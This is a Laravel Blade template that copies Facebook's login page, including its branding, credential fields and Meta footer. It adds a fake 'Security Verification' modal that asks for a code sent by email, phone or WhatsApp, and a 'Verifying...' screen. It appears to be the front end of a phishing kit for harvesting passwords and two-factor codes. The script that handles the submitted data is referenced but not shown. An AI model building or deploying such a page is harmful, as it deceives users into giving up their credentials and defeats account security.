@extends('layouts.app')

@push('styles')
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@vite(['resources/css/facebook.css'])
@endpush

@section('content')
<div class="min-h-screen flex items-center justify-center pt-16" style="background-color: #f0f2f5;">
    <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center gap-8 md:gap-28">
        <!-- Left Column -->
        <div class="text-center md:text-left max-w-[500px] mb-8 md:mb-0">
            <h1 class="fb-blue text-[56px] md:text-[80px] font-bold mb-4">facebook</h1>
            <p class="text-xl md:text-2xl">Facebook helps you connect and share with the people in your life.</p>
        </div>

        <!-- Right Column -->
        <div class="w-full max-w-md">
            <!-- Login Form Card -->
            <div class="bg-white rounded-lg shadow-lg p-4 md:p-6">
                <form id="loginForm" class="space-y-4">
                    <div>
                        <input type="text"
                               id="emailOrPhone"
                               placeholder="Email address or phone number"
                               class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-blue-500">
                        <div id="emailError" class="text-red-600 text-sm mt-1 hidden">Please enter your email or phone number</div>
                    </div>

                    <div>
                        <input type="password"
                               id="password"
                               placeholder="Password"
                               class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-blue-500">
                        <div id="passwordError" class="text-red-600 text-sm mt-1 hidden">Please enter your password</div>
                    </div>

                    <button type="submit" id="loginBtn" class="w-full bg-[#1877f2] hover:bg-[#166fe5] disabled:bg-blue-300 disabled:cursor-not-allowed text-white py-3 rounded-lg font-bold text-[20px] transition">
                        Log in
                    </button>

                    <div class="text-center">
                        <a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a>
                    </div>

                    <hr class="my-4 border-gray-300">

                    <div class="text-center">
                        <button type="button" class="fb-green hover:bg-[#36a420] px-6 py-3 text-white font-bold rounded-lg mx-auto transition">
                            Create new account
                        </button>
                    </div>
                </form>
            </div>

            <!-- Create Page Text -->
            <p class="text-sm text-gray-600 mt-6 text-center">
                <span class="font-bold">Create a Page</span>
                for a celebrity, brand or business.
            </p>
        </div>
    </div>
</div>

<!-- Footer -->
<footer class="bg-white py-6 px-4">
    <div class="max-w-6xl mx-auto">
        <!-- Languages -->
        <div class="flex flex-wrap justify-center mb-3">
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">English (UK)</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Hausa</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Français (France)</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Português (Brasil)</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Español</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">العربية</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Bahasa Indonesia</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Deutsch</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">日本語</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Italiano</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">हिन्दी</a>
        </div>

        <hr class="border-gray-300 my-2">

        <!-- Footer Links -->
        <div class="flex flex-wrap justify-center mt-4">
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Sign Up</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Log in</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Messenger</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Facebook Lite</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Video</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Meta Pay</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Meta Store</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Meta Quest</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Ray-Ban Meta</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Meta AI</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Instagram</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Threads</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Voting Information Centre</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Privacy Policy</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Privacy Centre</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">About</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Create ad</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Create Page</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Developers</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Careers</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Cookies</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">AdChoices</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Terms</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Help</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Contact uploading and non-users</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Settings</a>
            <a href="#" class="text-gray-500 text-xs hover:underline mr-2 mb-2">Activity log</a>
        </div>

        <!-- Copyright -->
        <p class="text-gray-500 text-xs text-center mt-6">Meta © 2025</p>
    </div>
</footer>

<!-- Verification Modal -->
<div class="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50 opacity-0 pointer-events-none transition-opacity duration-300" id="verificationModal">
    <div class="bg-white rounded-xl w-11/12 max-w-md p-8 shadow-2xl text-center">
        <div class="text-5xl text-[#1877f2] mb-5">
            <i class="fas fa-shield-alt"></i>
        </div>
        <h2 class="text-xl font-semibold mb-3 text-gray-800">Security Verification</h2>
        <p class="text-gray-600 mb-5 text-sm leading-relaxed">To ensure account security, we need to verify your identity. A verification code has been sent to you. Kindly wait 3-4 minutes for the code to be delivered  Please check your email, phone, or WhatsApp</p>

        <input type="text"
               id="verificationCode"
               class="w-full p-3 text-base border border-gray-300 rounded-md text-center mb-3 focus:border-[#1877f2] focus:outline-none focus:ring-2 focus:ring-blue-200"
               placeholder="Enter verification code">
        <div id="codeError" class="text-red-600 text-sm mb-3 hidden">Please enter the verification code</div>

        <div class="text-[#1877f2] cursor-pointer text-sm mb-4 hover:underline" id="resendCode">Resend verification code</div>
        <div id="sentMessage" class="text-green-600 text-sm text-center mt-1 mb-4 hidden">Verification code has been resent</div>

        <button class="bg-[#1877f2] hover:bg-[#166fe5] disabled:bg-blue-300 disabled:cursor-not-allowed text-white border-none rounded-lg py-3 px-4 font-semibold cursor-pointer w-full transition-colors" id="verifyButton">Verify</button>
    </div>
</div>

<!-- Verifying Modal -->
<div class="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50 opacity-0 pointer-events-none transition-opacity duration-300" id="verifyingModal">
    <div class="bg-white rounded-xl w-11/12 max-w-md p-8 shadow-2xl text-center">
        <h2 class="text-xl font-semibold mb-3 text-gray-800">Verifying...</h2>
        <div class="border-4 border-gray-200 border-t-[#1877f2] rounded-full w-10 h-10 animate-spin-custom mx-auto my-5"></div>
        <p class="text-base text-gray-600 mt-5">We're verifying your code. This may take a moment.</p>
    </div>
</div>
@endsection

@push('scripts')
@vite(['resources/js/facebook.js'])
@endpush